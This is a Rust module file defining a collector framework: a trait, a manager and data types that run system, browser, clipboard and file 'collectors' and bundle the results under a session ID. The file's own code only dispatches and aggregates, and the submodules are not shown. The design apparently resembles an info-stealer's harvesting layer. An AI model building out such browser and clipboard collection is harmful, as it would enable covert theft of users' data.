//! Data collectors module

#![allow(dead_code)]

pub mod system_info;
pub mod browser;
pub mod clipboard;
pub mod files;

use std::collections::HashMap;
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use thiserror::Error;

pub use system_info::SystemInfoCollector;
pub use browser::BrowserCollector;
pub use clipboard::ClipboardCollector;
pub use files::FileCollector;

#[derive(Error, Debug)]
pub enum CollectorError {
    #[error("not supported: {0}")]
    NotSupported(String),
    
    #[error("collection failed: {0}")]
    CollectionFailed(String),
    
    #[error("io: {0}")]
    IoError(#[from] std::io::Error),
    
    #[error("json: {0}")]
    SerializationError(#[from] serde_json::Error),
    
    #[error("unknown module: {0}")]
    UnknownModule(String),
}

/// Trait principal para todos os coletores
pub trait Collector: Send + Sync {
    fn name(&self) -> &str;
    fn collect(&self) -> Result<ModuleData, CollectorError>;
    fn is_supported(&self) -> bool;
    fn priority(&self) -> u8 { 50 }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CollectedData {
    pub timestamp: DateTime<Utc>,
    pub session_id: String,
    pub modules: HashMap<String, ModuleData>,
    pub metadata: CollectionMetadata,
}

impl CollectedData {
    pub fn new() -> Self {
        Self {
            timestamp: Utc::now(),
            session_id: uuid::Uuid::new_v4().to_string(),
            modules: HashMap::new(),
            metadata: CollectionMetadata::default(),
        }
    }
    
    pub fn add_module(&mut self, name: String, data: ModuleData) {
        self.modules.insert(name, data);
    }
}

impl Default for CollectedData {
    fn default() -> Self {
        Self::new()
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct CollectionMetadata {
    pub duration_ms: u64,
    pub modules_run: u32,
    pub modules_success: u32,
    pub errors: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum ModuleData {
    System(system_info::SystemData),
    Browser(browser::BrowserData),
    Clipboard(clipboard::ClipboardData),
    Files(files::FileData),
    Generic(serde_json::Value),
}

pub struct CollectorManager {
    collectors: Vec<Box<dyn Collector>>,
}

impl CollectorManager {
    pub fn new() -> Self {
        Self { collectors: Vec::new() }
    }
    
    pub fn register_module(&mut self, name: &str) -> Result<(), CollectorError> {
        let collector: Box<dyn Collector> = match name.to_lowercase().as_str() {
            "system" => Box::new(SystemInfoCollector::new()),
            "browser" => Box::new(BrowserCollector::new()),
            "clipboard" => Box::new(ClipboardCollector::new()),
            "files" => Box::new(FileCollector::new()),
            other => return Err(CollectorError::UnknownModule(other.to_string())),
        };
        
        if collector.is_supported() {
            self.collectors.push(collector);
        }
        
        Ok(())
    }
    
    pub fn collector_count(&self) -> usize {
        self.collectors.len()
    }
    
    pub async fn run_all(&self) -> Result<CollectedData, CollectorError> {
        let start = std::time::Instant::now();
        let mut collected = CollectedData::new();
        let mut errors = Vec::new();
        
        let mut collectors: Vec<_> = self.collectors.iter().collect();
        collectors.sort_by(|a, b| b.priority().cmp(&a.priority()));
        
        for collector in collectors {
            match collector.collect() {
                Ok(data) => {
                    collected.add_module(collector.name().to_string(), data);
                    collected.metadata.modules_success += 1;
                }
                Err(e) => {
                    let error_msg = format!("{}", e);
                    errors.push(error_msg);
                }
            }
            collected.metadata.modules_run += 1;
        }
        
        collected.metadata.duration_ms = start.elapsed().as_millis() as u64;
        collected.metadata.errors = errors;
        
        Ok(collected)
    }
}

impl Default for CollectorManager {
    fn default() -> Self {
        Self::new()
    }
}
